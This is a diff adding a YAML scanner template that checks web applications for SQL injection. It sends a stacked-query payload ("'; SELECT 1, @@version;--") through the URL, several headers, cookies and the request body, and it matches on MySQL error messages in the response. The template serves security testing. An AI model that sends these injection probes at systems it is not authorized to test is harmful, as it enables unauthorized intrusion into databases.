@@ -1,0 +1,39 @@
+id: sqli-in-message
+info:
+  name: SQL Injection in HTTP Message
+  author: [Author Name]
+  severity: high
+  description: |
+    This template checks for SQL Injection vulnerabilities in all parts of an HTTP message, including the URL, headers, and body.
+
+tags:
+  - injection
+  - sqli
+  - message
+
+requests:
+  - method: GET
+    path:
+      - "/"
+      - "/'; SELECT 1, @@version;--"
+      - "/?id='; SELECT 1, @@version;--"
+      - "/?id=1'; SELECT 1, @@version;--"
+    headers:
+      - name: User-Agent
+        value: "'; SELECT 1, @@version;--"
+      - name: X-Forwarded-For
+        value: "'; SELECT 1, @@version;--"
+      - name: Referer
+        value: "'; SELECT 1, @@version;--"
+      - name: Cookie
+        value: "'; SELECT 1, @@version;--"
+      - name: Authorization
+        value: "'; SELECT 1, @@version;--"
+    body:
+      - "'; SELECT 1, @@version;--"
+      - "id=1'; SELECT 1, @@version;--"
+    tests:
+      - type: word
+        words:
+          - "You have an error in your SQL syntax"
+          - "MySQL server version for the right syntax to use near"
